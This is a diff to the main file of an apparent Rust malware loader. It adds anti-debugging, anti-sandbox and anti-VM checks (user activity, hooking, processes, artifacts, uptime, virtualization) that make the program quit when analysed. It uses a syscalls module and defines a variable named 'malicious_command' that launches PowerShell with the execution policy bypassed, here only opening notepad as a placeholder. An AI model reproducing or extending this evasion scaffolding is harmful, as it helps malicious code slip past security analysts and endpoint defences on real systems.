@@ -1,8 +1,9 @@
 #![allow(non_snake_case)]
 #![allow(unused_unsafe)]
 mod syscalls;
-mod checks;
-use rustdefender::*;
+use a_d::run_all_checks_hidden as ad_checks;
+use a_s::*;
+use a_v::is_virtualized as av_checks;
 use crate::syscalls::SYSCALLS;
 use std::mem::{size_of, zeroed};
 use std::ptr::null_mut;
@@ -26,10 +27,18 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
 }
 
 fn main() {
-    if checks::run_all_checks_old() {
+    if ad_checks() {
         return;
     }
-    if rustdefender::run_all_checks() {
+    if check_user_activity()
+        || check_for_hooking()
+        || check_processes()
+        || check_artifacts()
+        || check_uptime()
+    {
+        return;
+    }
+    if av_checks() {
         return;
     }
     let malicious_command = r#"powershell.exe -ExecutionPolicy Bypass -Command "notepad""#;
